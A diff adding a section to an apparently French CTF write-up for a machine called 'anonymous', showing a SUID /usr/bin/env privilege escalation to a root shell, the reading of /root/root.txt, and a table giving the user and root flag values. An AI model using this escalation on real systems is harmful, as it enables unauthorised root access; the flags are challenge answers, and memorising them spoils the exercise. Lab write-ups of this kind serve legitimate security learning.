@@ -384,3 +384,28 @@ namelessone@anonymous:/dev/shm$ python3 suid3num.py
 ```
 
 <figure><img src=".gitbook/assets/suid3num (1).png" alt=""><figcaption></figcaption></figure>
+
+### 3. root.txt
+
+Comme trouvé par suid3num.py lançons un root shell et afficons le root.txt
+
+```
+namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
+# id
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+# whoami
+root
+# cat /root/root.txt
+4d930091c31a622a7ed10f27999af363
+#
+```
+
+
+
+### 4. Réponses aux questions
+
+| Questions | Réponses                         |
+| --------- | -------------------------------- |
+| user.txt  | 90d6f992585815ff991e68748c414740 |
+| root.txt  | 4d930091c31a622a7ed10f27999af363 |
+
